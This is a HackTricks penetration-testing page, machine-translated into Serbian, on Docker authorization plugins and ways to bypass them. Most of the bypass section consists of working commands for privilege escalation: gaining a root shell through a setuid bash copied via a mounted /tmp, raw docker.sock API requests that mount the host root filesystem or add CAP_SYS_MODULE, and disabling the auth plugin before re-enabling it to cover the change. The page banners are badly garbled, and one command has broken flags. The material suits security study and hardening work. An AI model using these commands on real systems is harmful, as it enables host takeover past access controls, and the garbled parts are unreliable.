{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Learn & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}


**Dockerov** model **autorizacije** je **sve ili ništa**. Svaki korisnik sa dozvolom za pristup Docker demon može **izvršiti bilo koju** Docker klijentsku **komandu**. Isto važi i za pozivaoce koji koriste Dockerov Engine API za kontaktiranje demona. Ako vam je potrebna **veća kontrola pristupa**, možete kreirati **autorizacione dodatke** i dodati ih u konfiguraciju vašeg Docker demona. Korišćenjem autorizacionog dodatka, Docker administrator može **konfigurisati granularne politike pristupa** za upravljanje pristupom Docker demonu.

# Osnovna arhitektura

Docker Auth dodaci su **spoljni** **dodaci** koje možete koristiti da **dozvolite/odbacite** **akcije** koje se traže od Docker demona **u zavisnosti** od **korisnika** koji je to zatražio i **akcije** **koja se traži**.

**[Sledeće informacije su iz dokumentacije](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Kada se **HTTP** **zahtev** šalje Docker **demonu** putem CLI ili putem Engine API, **sistem autentifikacije** **prosledi** zahtev instaliranom **autentifikacionom** **dodatku**(cima). Zahtev sadrži korisnika (pozivaoca) i kontekst komande. **Dodatak** je odgovoran za odlučivanje da li da **dozvoli** ili **odbaci** zahtev.

Dijagrami sekvenci ispod prikazuju tok autorizacije dozvola i odbijanja:

![Tok autorizacije dozvola](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Tok autorizacije odbijanja](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Svaki zahtev poslat dodatku **uključuje autentifikovanog korisnika, HTTP zaglavlja i telo zahteva/odgovora**. Samo su **ime korisnika** i **metoda autentifikacije** korišćena prosleđena dodatku. Najvažnije, **nema** korisničkih **akreditiva** ili tokena koji se prosleđuju. Na kraju, **ne šalju se svi zahtevi/tela odgovora** autorizacionom dodatku. Samo ona tela zahteva/odgovora gde je `Content-Type` ili `text/*` ili `application/json` se šalju.

Za komande koje potencijalno mogu preuzeti HTTP vezu (`HTTP Upgrade`), kao što je `exec`, autorizacioni dodatak se poziva samo za inicijalne HTTP zahteve. Kada dodatak odobri komandu, autorizacija se ne primenjuje na ostatak toka. Konkretno, streaming podaci se ne prosleđuju autorizacionim dodacima. Za komande koje vraćaju delimične HTTP odgovore, kao što su `logs` i `events`, samo se HTTP zahtev šalje autorizacionim dodacima.

Tokom obrade zahteva/odgovora, neki tokovi autorizacije mogu zahtevati dodatne upite ka Docker demonu. Da bi se završili takvi tokovi, dodaci mogu pozvati API demona slično kao običan korisnik. Da bi omogućili ove dodatne upite, dodatak mora obezbediti sredstva za administratora da konfiguriše odgovarajuće politike autentifikacije i bezbednosti.

## Nekoliko dodataka

Vi ste odgovorni za **registraciju** vašeg **dodatka** kao deo **pokretanja** Docker demona. Možete instalirati **više dodataka i povezati ih**. Ova veza može biti uređena. Svaki zahtev ka demonu prolazi redom kroz ovu vezu. Samo kada **svi dodaci odobre pristup** resursu, pristup se odobrava.

# Primeri dodataka

## Twistlock AuthZ Broker

Dodatak [**authz**](https://github.com/twistlock/authz) vam omogućava da kreirate jednostavnu **JSON** datoteku koju će **dodatak** **čitati** da bi autorizovao zahteve. Stoga, pruža vam priliku da vrlo lako kontrolišete koji API krajnji tačke mogu da dostignu svaki korisnik.

Ovo je primer koji će omogućiti Alisi i Bobu da kreiraju nove kontejnere: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

Na stranici [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) možete pronaći odnos između traženog URL-a i akcije. Na stranici [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) možete pronaći odnos između imena akcije i akcije.

## Jednostavan vodič za dodatke

Možete pronaći **lako razumljiv dodatak** sa detaljnim informacijama o instalaciji i debagovanju ovde: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Pročitajte `README` i `plugin.go` kod da biste razumeli kako funkcioniše.

# Docker Auth Plugin Bypass

## Enumeracija pristupa

Glavne stvari koje treba proveriti su **koje krajnje tačke su dozvoljene** i **koje vrednosti HostConfig su dozvoljene**.

Da biste izvršili ovu enumeraciju, možete **koristiti alat** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## zabranjeno `run --privileged`

### Minimalne privilegije
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Pokretanje kontejnera i zatim dobijanje privilegovane sesije

U ovom slučaju, sysadmin **nije dozvolio korisnicima da montiraju volumene i pokreću kontejnere sa `--privileged` oznakom** ili daju bilo koju dodatnu sposobnost kontejneru:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Međutim, korisnik može **napraviti shell unutar pokrenutog kontejnera i dati mu dodatne privilegije**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Sada, korisnik može da pobegne iz kontejnera koristeći neku od [**prethodno diskutovanih tehnika**](./#privileged-flag) i **poveća privilegije** unutar hosta.

## Montiranje Writable Folder-a

U ovom slučaju, sysadmin je **zabranio korisnicima da pokreću kontejnere sa `--privileged` flagom** ili daju bilo kakvu dodatnu sposobnost kontejneru, i dozvolio je samo montiranje `/tmp` foldera:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Napomena da možda ne možete montirati folder `/tmp`, ali možete montirati **drugi zapisiv folder**. Možete pronaći zapisive direktorijume koristeći: `find / -writable -type d 2>/dev/null`

**Napomena da ne podržavaju svi direktorijumi na linux mašini suid bit!** Da biste proverili koji direktorijumi podržavaju suid bit, pokrenite `mount | grep -v "nosuid"`. Na primer, obično `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` i `/var/lib/lxcfs` ne podržavaju suid bit.

Takođe, napomena da ako možete **montirati `/etc`** ili bilo koji drugi folder **koji sadrži konfiguracione fajlove**, možete ih promeniti iz docker kontejnera kao root kako biste **zloupotrebili na hostu** i eskalirali privilegije (možda modifikovanjem `/etc/shadow`)
{% endhint %}

## Nepроверени API Endpoint

Odgovornost sysadmin-a koji konfiguriše ovaj plugin biće da kontroliše koje akcije i sa kojim privilegijama svaki korisnik može da izvrši. Stoga, ako admin preuzme pristup **crnoj listi** sa endpoint-ima i atributima, može **zaboraviti neke od njih** koji bi mogli omogućiti napadaču da **eskalira privilegije.**

Možete proveriti docker API na [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Nepроверena JSON Struktura

### Binds u root

Moguće je da kada je sysadmin konfigurisao docker firewall, **zaboravio na neki važan parametar** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Binds**".\
U sledećem primeru moguće je zloupotrebiti ovu pogrešnu konfiguraciju da se kreira i pokrene kontejner koji montira root (/) folder hosta:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Obratite pažnju na to kako u ovom primeru koristimo **`Binds`** parametar kao ključ na vrhunskom nivou u JSON-u, ali u API-ju se pojavljuje pod ključem **`HostConfig`**
{% endhint %}

### Binds u HostConfig

Pratite iste upute kao sa **Binds u root** izvršavajući ovaj **request** ka Docker API-ju:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Mounts in root

Pratite iste upute kao i za **Binds in root** izvršavajući ovu **request** ka Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Mounts in HostConfig

Pratite iste instrukcije kao sa **Binds in root** izvršavajući ovaj **request** ka Docker API:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Unchecked JSON Attribute

Moguće je da je kada je sistem administrator konfigurisao docker vatrozid **zaboravio na neki važan atribut parametra** [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) kao što je "**Capabilities**" unutar "**HostConfig**". U sledećem primeru moguće je iskoristiti ovu pogrešnu konfiguraciju da se kreira i pokrene kontejner sa **SYS\_MODULE** sposobnošću:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
**`HostConfig`** је кључ који обично садржи **занимљиве** **права** за бекство из контејнера. Међутим, као што смо раније расправљали, приметите како коришћење Binds ван њега такође функционише и може вам омогућити да заобиђете ограничења.
{% endhint %}

## Онемогућавање Плугинa

Ако је **систем администратор** **заборавио** да **забрани** могућност **онемогућавања** **плугинa**, можете искористити ово да га потпуно онемогућите!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Zapamtite da **ponovo omogućite dodatak nakon eskalacije**, ili **ponovno pokretanje docker usluge neće raditi**!

## Auth Plugin Bypass writeups

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

## References
{% hnt stye="acceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
